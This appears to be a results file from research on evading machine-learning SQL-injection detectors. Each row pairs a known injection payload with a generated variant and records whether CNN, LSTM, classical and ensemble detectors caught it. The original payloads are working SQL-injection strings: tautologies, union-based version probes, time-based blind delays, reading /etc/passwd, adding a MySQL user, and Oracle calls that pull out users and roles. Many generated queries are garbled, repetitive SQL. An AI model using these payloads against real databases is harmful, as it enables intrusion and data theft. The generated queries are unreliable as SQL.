original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
"admin""  )   or   (  ""1""  =  ""1",SELECT MIN(1) FROM SQL injection detection,1,1,1,0,1,1,0
" select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR 1##@ union select 'a',version ( ) -- 1",1,1,1,0,0,0,0
"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",SELECT COUNT(*) FROM SQL AS _number FROM query: 1 ORDER BY query: 1,1,0,1,1,1,1,1
" select * from users where id  =  1 union select .1_,version  (    )   -- 1",SELECT MIN(version) FROM SQL injection detection,1,0,1,1,1,1,1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,"SELECT SELECT SELECT SELECT FROM SQL injection, COUNT(*) FROM query: AND 1 = utl_inaddr.get_host_address.get_host_address.get_host_address.get_host_address.get_host_address.get_host_address.get_host_address.get_host_address.get_host_address.get_host_address FROM DUAL SELECT SELECT FROM SQL injection' AND NOT SELECT - SELECT MIN((SELECT MIN((SELECT MIN((SELECT MIN((SELECT_host_address.get_host_address.get_host_address) FROM SELECT SELECT MIN(SELECT FROM SQL injection) FROM 'utl_inaddr.get_host_address.get_host_address.get_host_address.get_host_address.sql Query:'sq injection'",0,0,1,1,1,1,1
" or 0  =  0 #""",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,SELECT * FROM * FROM SQL injection detection WHERE id = 1 OR 1 = 1,1,0,1,0,1,1,0
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,SELECT * FROM * FROM SQL_injections WHERE id = 1 %!@ or 1 = 1,1,0,0,0,0,0,0
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",SELECT MIN(sequence) FROM SQL injection - SELECT MIN(sequence) FROM SQL_injection),1,0,1,1,1,1,1
1  )   or sleep  (  __TIME__  )  #,"SELECT * FROM SQL AS __TIME__, ORDER BY * DESC LIMIT 1",0,0,1,1,0,1,0
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""1_"" OR 1 = 1 AND 1 = 1",0,1,1,0,0,0,0
" select * from users where id  =  1 <1## union select 1,version  (    )   -- 1","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = 1 1## union select 1,version ( ) -- 1",1,1,0,0,0,0,0
" select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1","SELECT * FROM * FROM * FROM users WHERE NOT id = 1 + $+* union select null,@@VERSION -- 1",1,1,1,0,1,1,0
select * from users where id  =  1. <@ or 1  =  1 -- 1,SELECT * FROM * FROM SQL injection detection WHERE id = 1 @ or 1 = 1,1,0,1,0,0,0,0
 or true--,"SELECT * FROM SQL AS t1 JOIN query: or true-- SELECT * FROM query: or true-- SELECT * FROM query: or true-- SELECT * FROM query: or true-- SELECT * FROM query: or true-- SELECT * FROM SQL_inject = ""unknown"" AND NOT SQL_inject = ""yes""",0,1,1,0,1,1,0
; execute immediate 'sel' || 'ect us' || 'er',SELECT MIN(sql injection) FROM SQL SELECT SELECT DISTINCT'sel' || 'ect us' || 'er' FROM SQL injection',1,1,1,0,0,0,0
hi' or 'x'  =  'x';,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: hi' OR 'x' = 'x',1,1,0,0,1,0,0
select * from users where id  =  1 <@ or 1  =  1 -- 1,SELECT * FROM * FROM SQL injection detection WHERE id = 1 @ or 1 = 1,1,0,1,0,0,0,0
" select * from users where id  =  1 or "".,"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE id = 1 OR ""."" OR 1 = 1",0,1,1,0,0,0,0
admin' #,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
" select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",SELECT MIN(1) FROM SQL injection detection,1,1,1,0,1,1,0
" select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 ORDER BY id = 1 ORDER BY id = 1,1,1,1,0,0,0,0
" select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE id = 1 OR NOT id = 1 OR  = 1 ORDER BY 1,1,1,1,0,0,0,0
" union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"""  )  ;waitfor delay '0:0:__TIME__'--",SELECT MIN(unique SQL) FROM query: '0:0:__TIME__'-- for',1,1,1,0,0,0,0
 or 'unusual'   =   'unusual',SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM query: or 'unusual' FROM query: or 'unusual',1,0,1,0,1,1,0
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",SELECT DISTINCT'sql injection detection' FROM SQL_injection,1,0,1,1,1,1,1
"admin"" or ""1""  =  ""1""/*","SELECT MIN(""sql injection detection"") FROM SQL SELECT MIN(1) FROM SQL SELECT SELECT MIN(1) FROM SQL",1,1,0,0,1,0,0
" select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1","SELECT * FROM * FROM SQL injection detection WHERE id = 1 OR ""1 ( = 1 OR 1 = 1) ORDER BY COUNT(*) DESC LIMIT 1)",0,1,0,0,0,0,0
" select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR 1 union select 1,@@VERSION -- 1",0,1,1,0,0,0,0
like,SELECT * FROM SQL AS t1 JOIN query: 'yes' FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM SQL_injector WHERE NOT SELECT * FROM Query: 'yes' AND NOT SELECT * FROM Query: 'yes',0,0,1,1,1,1,1
or username like char  (  37  )  ;,SELECT DISTINCT SQL FROM query: or username like char ( 37 ),1,0,1,1,0,1,0
 )    )    or pg_sleep  (  __TIME__  )  --,"SELECT __TIME__, COUNT(*) FROM SQL_injector WHERE NOT __TIME__ = ""yes""",1,0,1,0,0,0,0
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,SELECT * FROM * FROM * FROM users WHERE id = 1 OR $+ OR 1 = 1,0,1,1,0,1,1,0
or 3  =  3,"SELECT * FROM query: or 3 = 3 WHERE NOT SQL_injection = ""valid""",1,0,0,0,1,0,0
" select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""(. or 1 = 1 AND 1 = 1",0,1,0,0,0,0,0
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,SELECT * FROM * FROM * FROM users WHERE NOT id = 1 OR ( $+ ) = 1 OR 1 = 1,0,1,0,0,0,0,0
exec sp,"SELECT * FROM query: exec sp WHERE NOT SQL_injection = ""valid""",1,0,1,1,1,1,1
" select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR +$ union select 1,@@VERSION -- 1",1,1,1,0,0,0,0
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,SELECT * FROM * FROM users WHERE NOT id = 1 OR $ = 1 OR 1 = 1,1,1,1,0,0,0,0
" select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = 1 &&1 union select 1,version ( ) -- 1",1,1,0,0,0,0,0
admin' or 1  =  1/*,SELECT MIN(1 = 1/*) FROM SQL injection detection,1,1,0,0,1,0,0
a' waitfor delay '0:0:10'--,SELECT MIN(sql injection) FROM SQL Query: a' waitfor delay '0:0:10'-- for',1,1,0,0,0,0,0
" select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1","SELECT MIN(SQL injection) FROM SQL_Injection WHERE NOT id = 1 union select.1$_,version ( ) -- 1",1,1,0,0,0,0,0
and 1 in   (  select var from temp  )  --,SELECT DISTINCT var FROM SQL injection detection,1,0,1,1,1,1,1
hi'  )   or   (  'a'  =  'a,SELECT DISTINCT'sql injection detection' FROM SQL SELECT SELECT DISTINCT 'a' FROM SQL SELECT SELECT DISTINCT 'a' FROM SQL SELECT SELECT DISTINCT 'a' FROM SQL SELECT MIN('a' = 'a'),1,0,1,0,0,0,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i","SELECT MIN(SELECT) FROM (SELECT SELECT SELECT MIN(SELECT SELECT FROM) AS _local_address WHERE NOT SELECT SELECT SELECT FROM SQL SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SQL_inaddr.get_host_address WHERE NOT SELECT = ""utl_inaddr.get_host_address.) AND NOT SELECT SELECT SELECT SELECT SELECT MIN((SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN",0,0,0,1,1,1,0
"admin"" or 1  =  1",SELECT MIN(1 = 1) FROM SQL injection detection,1,1,0,0,1,0,0
"""  )   or true--","SELECT * FROM SQL AS t1 JOIN query: 'yes', query: 'yes', writes: 'yes', writes: 'yes', writes: 'yes', writes: 'yes', writes: 'yes', writes: 'yes', writes: 'yes', writes: 'yes', writes: 'yes', writes: 'yes', writes: 'yes', writes: 'yes', writes: ""sql injection"" FROM sq = ""sq injection""",0,0,1,0,1,1,0
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",SELECT * FROM SQL injection detection WHERE NOT id = 1 OR $  1,1,1,1,1,1,1,1
" select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE id = 1 OR NOT id = 1 OR  = 1 ORDER BY 1 = 1,1,1,1,0,0,0,0
1  )   or pg_sleep  (  __TIME__  )  --,"SELECT __TIME__, COUNT(*) FROM SQL_inject = ""valid"" AND NOT __TIME__ > ""discuss""",1,0,1,0,0,0,0
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE id = 1 OR NOT id = 1 OR  = 1 ORDER BY 1,1,1,1,0,0,0,0
"""  )   or sleep  (  __TIME__  )    =  """,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
select * from users where id  =  1.<@. or 1  =  1 -- 1,"SELECT * FROM * FROM SQL injection detection WHERE id = ""1.1@. or 1 = 1 AND 1 = 1",0,1,1,0,0,0,0
"admin""  )   or   (  ""1""  =  ""1""--","SELECT MIN(""1"") FROM SQL injection detection",1,0,0,0,1,0,0
" select * from users where id  =  1<@.. union select 1,version  (    )   -- 1","SELECT MIN( ) FROM SQL injection detection WHERE NOT id = 1@. union select 1,version ( ) -- 1",1,1,1,0,0,0,0
; exec xp_regread,"SELECT * FROM query: ; exec xp_regread WHERE NOT SQL_regread = ""valid""",1,0,1,1,1,1,1
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = '1' + @ 1 union select 1,version ( ) -- 1'",1,1,1,0,0,0,0
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,SELECT * FROM * FROM * FROM users WHERE id = 1 + +%1 or 1 = 1,1,1,0,0,0,0,0
" select * from users where id  =  1 or "";1"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR "";1"" OR 1 = 1",0,0,1,0,0,0,0
" select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR id = 1 OR id = 1 OR i = 1 ORDER BY 1 = 1,1,1,1,0,0,0,0
1 and 1  =  1,SELECT * FROM query: 1 AND NOT SQL_injection IS NULL,1,1,1,1,1,1,1
or 0  =  0 #,SELECT * FROM query: or 0 = 0,1,1,1,1,1,1,1
union select * from users where login   =   char ...,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
" select * from users where id  =  1 union select 1||@,version  (    )   -- 1","SELECT DISTINCT elude_sq_injection FROM users WHERE NOT id = 1 union select 1||@,version ( ) -- 1",1,1,1,0,0,0,0
admin'  )   or '1'  =  '1'--,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
1;SELECT *,SELECT MIN(SELECT) FROM SELECT MIN(sequence) FROM SQL injection detection WHERE NOT SELECT FROM query: 1;SELECT * FROM query: 1;SELECT * FROM query: 1;SELECT * FROM SQL SELECT SELECT MIN(sequence) FROM SQL SELECT MIN(sequence) FROM query: 1;SELECT SELECT MIN(sequence) FROM query: 1;SELECT MIN(SELECTECT FROM SELECT SELECT FROM SELECT SELECT FROM SELECT SELECT FROM SELECT SELECT FROM SELECT SELECT FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT SELECT SELECT MIN(seq_injection) FROM SELECT SELECT SELECT FROM FROM SELECT SELECT SELECT FROM FROM SQL injection) FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM FROM SELECT SELECT SELECT FROM FROM SELECT SELECT,0,0,1,0,1,1,0
" select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE id = 1 OR NOT id = 1 OR ; = 1 ORDER BY 1 = 1,1,0,1,0,0,0,0
x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = '1' OR id = '1' OR '""@ union select 1,version ( ) -- 1'",0,1,0,0,0,0,0
" select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""yes"" OR 1 = 1",0,1,1,0,0,0,0
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'","SELECT MIN(sql injection) FROM SQL Query WHERE id = '1' ||1 union select 1,banner from v$version'",1,1,1,0,0,0,0
"1 or benchmark  (  10000000,MD5  (  1   )    )   #","SELECT COUNT(*) FROM SQL AS _number FROM query: 1 OR query: 1 or benchmark (10000000,MD5 ( 1 ) - 1",1,1,0,0,1,0,0
procedure,"SELECT * FROM query: procedure WHERE NOT SQL_injection = ""valid""",1,0,1,1,1,1,1
or ''  =  ',SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM query: or 'yes',1,1,1,1,1,1,1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,SELECT SELECT MIN(SELECT SELECT SYS.LOGIN_USER FROM DUAL) AND NOT SELECT SELECT SELECT MIN(SELECT SELECT MIN(SELECT) FROM SQL_injection),0,1,1,1,1,1,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",SELECT SELECT FROM (SELECT SELECT SELECT MIN(ROWNUM) FROM SYS.ALL_USERS) AND NOT SELECT SELECT SELECT FROM (SELECT SELECT SELECT SELECT FROM SELECT SELECT MIN(ROWNUM) FROM),0,1,0,1,1,1,0
\'; desc users; --,SELECT NOT SQL_inject FROM query: '; desc users; -- FROM query: ',1,0,1,1,1,1,1
" select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR (. ) = 1,1,1,0,0,0,0,0
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',SELECT * FROM * FROM SQL_injections WHERE id = '1' OR $ 1 = 1 OR 1 = 1 AND 1 = 1,1,1,0,0,0,0,0
""" or """"^""","SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM query: ""done""",1,0,1,1,1,1,1
"""-""",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR  = 1 union select 1,@@VERSION -- 1",1,1,1,0,0,0,0
" select * from users where id  =  1 union select 1<@$,version  (    )   -- 1","SELECT MIN(version) FROM SQL injection detection WHERE NOT id = 1 union select 1@$,version ( ) = 1",1,1,0,0,0,0,0
" select * from users where id  =  1 *\ union select null,@@VERSION -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 * union select null,@@VERSION -- 1",1,1,1,0,0,0,0
" select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = 1 OR id = 1 OR!@ union select 1,version ( ) -- 1",1,1,1,0,0,0,0
" select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR.% = 1 OR 1 = 1,1,1,0,0,0,0,0
admin'/*,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM query: admin'/*,1,0,1,1,1,1,1
" select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""( #) or 1 = 1 AND 1 = 1",0,1,0,0,0,0,0
||UTL_HTTP.REQUEST,"SELECT NOT SQL_inject FROM query: ||UTL_HTTP.REQUEST = ""valid""",1,0,1,0,1,1,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",SELECT SELECT MIN(SELECT) FROM (SELECT SELECT SELECT MIN(SELECT SELECT FROM sys.all_tables) FROM) AND NOT SELECT SELECT SELECT SELECT SELECT FROM (SELECT SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM (SELECT AS t1 JOIN AS t2 ON T1.ABLE_name ='sw.inaddr.get_host_address.get_host_address.inaddr.get_host_address.get_host_address_address.inaddr.get_host_address_address) FROM (SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT ,0,0,0,1,1,1,0
" select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = 1'@. union select 1,version ( ) -- 1""",1,1,1,0,0,0,0
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #","SELECT COUNT(*) FROM SQL AS _number WHERE NOT SQL_injection = ""valid""",1,0,1,1,1,1,1
" select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = 1 @.$ union select 1,version ( ) -- 1",1,1,1,0,0,0,0
" select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",SELECT * FROM SQL injection detection WHERE NOT id = 1 OR $  1,1,1,1,1,1,1,1
select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',SELECT * FROM SQL injection detection WHERE id = '1' @.$ or 1 = 1 AND 1 = 1,1,1,0,0,0,0,0
1 uni/**/on select all from where,"SELECT DISTINCT t1.uni/**/on FROM Query: 1 UNION SELECT t1.uni/**/on FROM SELECT t1.sql injection_detection FROM SQL_injection_detection AS t1 JOIN discovery AS t2 ON t1.uni/**/on = t2.sql injection_detection_code WHERE NOT t2.done_name = ""disable""",1,0,1,1,0,1,0
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1","SELECT MIN(sql injection) FROM SQL injection detection WHERE NOT id = 1 +$. union select null,@@VERSION -- 1",1,1,1,0,0,0,0
" select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1","SELECT NOT SQL,version ( ) FROM null,version ( ) FROM users WHERE NOT id = 1 OR 1# = 1",1,1,1,0,0,0,0
admin'  )   or '1'  =  '1'#,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',SELECT DISTINCT'sql injection detection' FROM SQL SELECT MIN(sql injection detection) FROM query:||utl_http.request ('sql injection'),1,0,1,0,1,1,0
or '7659'  =  '7659,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: or '7659 = 7659',1,1,0,0,1,0,0
" select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE id = 1 OR NOT @ OR 1 = 1,1,1,1,0,0,0,0
" select * from users where id  =  1 union select +!<1,version  (    )   -- 1","SELECT MIN( ) FROM SQL injection detection WHERE NOT id = 1 union select +!1,version ( ) - 1",1,1,0,0,0,0,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",SELECT MIN(sql injection) FROM (SELECT SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SELECT SELECT MIN(sql injection) FROM) AND NOT SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SELECT MIN(sql injection) FROM (SELECT SELECT MIN(SELECT FROM (SELECT MIN(sql) FROM (SELECT MIN(sql injection) FROM (SELECT MIN(sql) FROM (SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SELECT MIN(sql) FROM (SELECT MIN(sql injection) FROM (SELECT SELECT SELECT MIN(sql_inaddr.get_host_address) FROM (SELECT SELECT SELECT SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SEL,0,1,0,0,1,0,0
" select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""( @) or 1 = 1 AND 1 = 1",0,1,0,0,0,0,0
or true--,"SELECT * FROM SQL AS t1 JOIN query: or true-- SELECT * FROM query: or true-- SELECT * FROM query: or true-- SELECT * FROM query: or true-- SELECT * FROM query: or true-- SELECT * FROM SQL_inject = ""unknown"" AND NOT SQL_inject = ""yes""",0,1,1,0,1,1,0
" select * from users where id  =  1 union select !<1,version  (    )   -- 1",SELECT MIN(1) FROM SQL injection detection,1,1,1,0,1,1,0
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'",SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
" select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR 1#"" union select 1,version ( ) -- 1",0,1,1,0,0,0,0
